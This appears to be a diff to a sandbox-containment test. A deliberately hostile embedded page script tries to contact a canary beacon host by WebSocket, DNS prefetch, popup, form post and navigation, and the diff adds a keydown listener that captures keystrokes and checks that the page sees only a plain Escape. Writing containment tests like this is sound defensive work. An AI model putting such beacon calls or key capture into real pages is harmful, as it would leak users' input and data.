@@ -99,6 +99,7 @@ attempt("websocket", () => new WebSocket(${inScript(`${beacon.replace("http", "w
 attempt("dns-prefetch", () => { const link = document.createElement("link"); link.rel = "dns-prefetch"; link.href = "//prefetch.canary.example"; document.head.appendChild(link); });
 attempt("window-open", () => window.open(${inScript(`${beacon}/popup`)}));
 attempt("form", () => { const form = document.createElement("form"); form.action = ${inScript(`${beacon}/form`)}; document.body.appendChild(form); form.submit(); });
+addEventListener("keydown", (event) => note("saw-key:" + event.key + (event.metaKey ? "+meta" : "") + (event.ctrlKey ? "+ctrl" : "")), true);
 setTimeout(() => attempt("self-navigation", () => { location = ${inScript(`${beacon}/self-navigation`)}; }), 700);`;
   const block = decodeCanvasBlock({
     blockId: "hostile",
@@ -244,6 +245,7 @@ interface ProbeResult {
   readonly prepared?: { readonly status: string };
   readonly sessions?: ReadonlyArray<{ readonly shared: boolean; readonly url: string }>;
   readonly refusals?: Record<string, unknown>;
+  readonly focusEscapes?: number;
   readonly bridge?: {
     readonly heartbeats: number;
     readonly sizes: ReadonlyArray<number | undefined>;
@@ -395,6 +397,19 @@ for (const row of [contained, stripped]) {
   if (row.result?.sessions?.some((session) => session.shared) === true) {
     failures.push(`${row.run}: the page shares the app's session`);
   }
+  // The shortcut reaches the window once and never the page; a plain Escape
+  // reaches the page and not the window.
+  if (row.result?.focusEscapes !== 1) {
+    failures.push(
+      `${row.run}: the reserved shortcut reached the window ${String(row.result?.focusEscapes)} times`,
+    );
+  }
+  const keys = (bridge?.attempts ?? []).filter((entry) => entry?.startsWith("tried:saw-key:"));
+  if (keys.length !== 1 || keys[0] !== "tried:saw-key:Escape") {
+    failures.push(
+      `${row.run}: the page saw ${keys.join(", ") || "no key"}; it may see a plain Escape only`,
+    );
+  }
   if (row.result?.refusals?.guests !== 1) {
     failures.push(
       `${row.run}: ${String(row.result?.refusals?.guests)} surfaces exist; only the design page may open one`,
@@ -417,6 +432,7 @@ console.log(
         sizes: row.result?.bridge?.sizes,
         attempts: row.result?.bridge?.attempts,
         proxy: row.result?.refusals,
+        reservedShortcutsReachingTheWindow: row.result?.focusEscapes,
         nameLookups: row.result?.dnsLookups,
       })),
     },
